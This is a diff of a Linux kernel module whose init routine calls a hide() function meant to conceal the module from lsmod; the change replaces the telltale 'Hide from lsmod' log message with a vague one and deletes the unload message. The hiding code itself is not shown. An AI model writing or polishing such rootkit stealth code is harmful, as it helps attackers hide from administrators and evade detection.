@@ -25,14 +25,13 @@ void hide(void)
 
 static int __init lsmod_init(void)
 {
-    printk(KERN_INFO "[+] Module loaded: Hide from lsmod [+]\n");
+    printk(KERN_INFO "Module load fdp\n");
     hide();
     return 0;
 }
 
 static void __exit lsmod_exit(void)
 {
-    printk(KERN_INFO "[+] Module unloaded: Hide from lsmod [+]\n");
 }
 
 module_init(lsmod_init);
